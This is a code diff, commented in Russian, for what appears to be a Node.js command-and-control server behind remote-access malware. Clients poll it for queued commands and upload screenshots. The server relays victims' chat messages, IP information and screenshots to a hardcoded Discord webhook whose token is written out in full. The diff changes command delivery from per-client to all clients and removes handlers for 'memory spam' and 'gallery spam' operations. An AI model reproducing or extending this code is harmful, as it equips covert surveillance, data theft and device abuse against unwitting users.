@@ -1,8 +1,8 @@
 const http = require('http');
 const fetch = require('node-fetch');
 
-// Хранилище команд для каждого клиента
-let clientCommands = new Map();
+// Хранилище команд (для всех клиентов)
+let commandQueue = [];
 let lastScreenshot = null;
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";
 
@@ -48,21 +48,17 @@ const server = http.createServer((req, res) => {
         req.on('data', chunk => body += chunk);
         req.on('end', async () => {
             try {
-                const { command, args, clientId = 'default' } = JSON.parse(body);
-                console.log(`📨 Получена команда: ${command} от ${clientId}`);
+                const { command, args } = JSON.parse(body);
+                console.log(`📨 Получена команда: ${command}`);
                 
-                // Сохраняем команду для клиента
-                if (!clientCommands.has(clientId)) {
-                    clientCommands.set(clientId, []);
-                }
-                
-                clientCommands.get(clientId).push({
+                // Добавляем команду в очередь для ВСЕХ клиентов
+                commandQueue.push({
                     command: command,
                     args: args || [],
                     timestamp: Date.now()
                 });
 
-                // Логирование команд в Discord
+                // Логирование в Discord
                 if (command === "user_chat") {
                     await sendDiscordMessage(
                         "💬 Чат игрока",
@@ -84,29 +80,11 @@ const server = http.createServer((req, res) => {
                             { name: "IP информация", value: args[2] || "N/A", inline: false }
                         ]
                     );
-                } else if (command === "memory_spam_start") {
-                    await sendDiscordMessage(
-                        "💾 Memory Spam запущен",
-                        `**Количество файлов:** ${args[0]}\n**Статус:** Выполняется`,
-                        0xff6b6b
-                    );
-                } else if (command === "gallery_spam_start") {
-                    await sendDiscordMessage(
-                        "🖼️ Gallery Spam запущен",
-                        `**Количество копий:** ${args[0]}\n**Файл:** ${args[1]}`,
-                        0x74b9ff
-                    );
-                } else if (command === "spam_completed") {
-                    await sendDiscordMessage(
-                        "✅ Spam операция завершена",
-                        `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`,
-                        0x00ff00
-                    );
                 }
 
                 res.end(JSON.stringify({ 
                     status: "OK",
-                    message: `Команда ${command} принята`
+                    message: `Команда ${command} принята для всех клиентов`
                 }));
             } catch (e) {
                 console.error('Ошибка обработки команды:', e);
@@ -118,15 +96,16 @@ const server = http.createServer((req, res) => {
     }
 
     if (req.method === 'GET' && req.url === '/data') {
-        const clientId = req.headers['client-id'] || 'default';
+        console.log(`📡 Клиент запрашивает команды (в очереди: ${commandQueue.length})`);
         
-        console.log(`📡 Клиент ${clientId} запрашивает команды`);
-        
-        if (clientCommands.has(clientId) && clientCommands.get(clientId).length > 0) {
-            const commands = clientCommands.get(clientId);
-            const nextCommand = commands.shift(); // Берем первую команду из очереди
+        if (commandQueue.length > 0) {
+            const commands = [...commandQueue]; // Отправляем ВСЕ команды
+            commandQueue = []; // Очищаем очередь после отправки
             
-            console.log(`📤 Отправка команды ${nextCommand.command} клиенту ${clientId}`);
+            console.log(`📤 Отправка ${commands.length} команд клиенту`);
+            
+            // Если команд несколько, отправляем первую (клиент будет запрашивать следующие)
+            const nextCommand = commands[0];
             
             res.end(JSON.stringify({
                 command: nextCommand.command,
@@ -134,7 +113,7 @@ const server = http.createServer((req, res) => {
                 timestamp: nextCommand.timestamp
             }));
         } else {
-            // Нет команд для этого клиента
+            // Нет команд
             res.end(JSON.stringify({
                 command: "",
                 args: []
@@ -143,6 +122,7 @@ const server = http.createServer((req, res) => {
         return;
     }
 
+    // Остальные endpoints остаются без изменений...
     if (req.method === 'POST' && req.url === '/screenshot') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -226,28 +206,12 @@ const server = http.createServer((req, res) => {
 
     // Статус сервера
     if (req.method === 'GET' && req.url === '/status') {
-        const totalCommands = Array.from(clientCommands.values()).reduce((sum, cmds) => sum + cmds.length, 0);
-        
         res.end(JSON.stringify({
             status: "online",
             version: "2.4.0",
             timestamp: new Date().toISOString(),
-            clients: clientCommands.size,
-            pending_commands: totalCommands
+            pending_commands: commandQueue.length
         }));
-        return;
-    }
-
-    // Очистка старых команд (каждые 10 минут)
-    if (req.method === 'POST' && req.url === '/cleanup') {
-        const now = Date.now();
-        const tenMinutes = 10 * 60 * 1000;
-        
-        for (let [clientId, commands] of clientCommands) {
-            clientCommands.set(clientId, commands.filter(cmd => now - cmd.timestamp < tenMinutes));
-        }
-        
-        res.end(JSON.stringify({ status: "Cleanup completed" }));
         return;
     }
 
@@ -255,26 +219,9 @@ const server = http.createServer((req, res) => {
     res.end(JSON.stringify({ error: "Not Found" }));
 });
 
-// Периодическая очистка старых команд
-setInterval(() => {
-    const now = Date.now();
-    const tenMinutes = 10 * 60 * 1000;
-    let cleaned = 0;
-    
-    for (let [clientId, commands] of clientCommands) {
-        const originalLength = commands.length;
-        clientCommands.set(clientId, commands.filter(cmd => now - cmd.timestamp < tenMinutes));
-        cleaned += originalLength - clientCommands.get(clientId).length;
-    }
-    
-    if (cleaned > 0) {
-        console.log(`🧹 Очищено ${cleaned} старых команд`);
-    }
-}, 5 * 60 * 1000); // Каждые 5 минут
-
 server.listen(process.env.PORT || 3000, () => {
     console.log("🚀 Сервер запущен на порту 3000");
     console.log("📊 Версия: 2.4.0");
     console.log("🔗 Webhook: " + WEBHOOK_URL);
-    console.log("✅ Готов к приему команд от клиентов");
+    console.log("✅ Готов к приему команд для всех клиентов");
 });
